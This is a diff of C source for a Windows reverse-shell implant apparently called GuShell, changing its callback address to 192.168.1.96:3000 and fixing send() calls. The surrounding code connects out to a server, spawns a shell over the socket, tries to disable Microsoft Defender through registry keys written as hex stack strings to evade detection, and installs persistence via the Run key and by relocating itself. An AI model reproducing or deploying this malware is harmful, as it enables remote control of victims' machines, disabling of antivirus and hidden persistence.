@@ -11,14 +11,14 @@
 #include <ShlObj.h>
 
 
-#define PORT "5000"
+#define PORT "3000"
 
 #define LOCALTEST
 
 #define GO_FOR_THROAT
 
 #ifdef LOCALTEST
-#define ADDRESS "Local IP ADDR"
+#define ADDRESS "192.168.1.96"
 #else
 #define ADDRESS "Public IP ADDR"
 #endif
@@ -53,7 +53,7 @@ SOCKET connectToServer() {
 			}
 
 			continue;
-		} 
+		}
 
 		break;
 	}
@@ -68,8 +68,8 @@ SOCKET connectToServer() {
 	return sockfd;
 }
 
-void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION * pPinfo) {
-	
+void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION* pPinfo) {
+
 	char shell[60];
 	char message[] = "Shell type (ex. cmd): ";
 
@@ -105,7 +105,7 @@ void attemptDefeatDefender(SOCKET* pSockfd) {
 
 	// Registry address on stack in hex
 	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x0050, 0x006f, 0x006c, 0x0069, 0x0063, 0x0069, 0x0065, 0x0073, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x0020, 0x0044, 0x0065, 0x0066, 0x0065, 0x006e, 0x0064, 0x0065, 0x0072, 0x0000 };
-	
+
 	// Need to get a handle to the registry tree.
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
 		send(*pSockfd, failed, sizeof failed, 0);
@@ -137,7 +137,7 @@ void attemptRegistryPersistence(SOCKET* pSockfd) {
 
 	char failedUser[] = "Failed to add value to system registry tree, failed persistence.\n";
 	char gotUser[] = "Success with User Key!\n";
-	
+
 	// oh my god. I cannot explain how much I hate this function. This line.
 	// I have spent two hours trying to figure out why it was able to print the directory but failed to
 	// go to the registry, infact it showed up in the registry in chinese. It took me TWO HOURS to realize
@@ -149,7 +149,7 @@ void attemptRegistryPersistence(SOCKET* pSockfd) {
 
 	// Registry path in stack string in hex
 	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };
-	
+
 	if ((rv = RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
 		send(*pSockfd, failedSys, sizeof failedSys, 0);
 	}
@@ -205,16 +205,16 @@ void attemptFullPersistence(SOCKET* pSockfd, TCHAR* dirName) {
 	wcscat(wszPath, name);
 
 	if (MoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
-		pSend(*pSockfd, failed, sizeof failed, 0);
+		send(*pSockfd, failed, sizeof failed, 0);
 		return;
 	}
 
-	Send(*pSockfd, succ, sizeof succ, 0);
+	send(*pSockfd, succ, sizeof succ, 0);
 
 	memcpy(dirName, wszPath, sizeof wszPath);
 
 	attemptRegistryPersistence(pSockfd, dirName);
-	
+
 }
 
 // ATTEMPT FULL BUT WITH NO NETWORK!!! IMPORTANT.
@@ -233,7 +233,7 @@ void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
 	if (MoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
 		return;
 	}
-	
+
 	memcpy(dirName, wszPath, sizeof wszPath);
 
 	DWORD charsWritten;
@@ -261,7 +261,7 @@ void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
 	if (rv == ERROR_SUCCESS) {
 		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
 		RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR));
-			
+
 	}
 
 	RegCloseKey(key);
@@ -306,7 +306,7 @@ int main(int argc, char* argv[]) {
 		"2. Attempt to stop defender\n"
 		"3. Attempt registry persistence.\n"
 		"4. Attempt full persistence with files and reg.\n";
-	
+
 	char commandOpt[50];
 	PROCESS_INFORMATION pinfo;
 
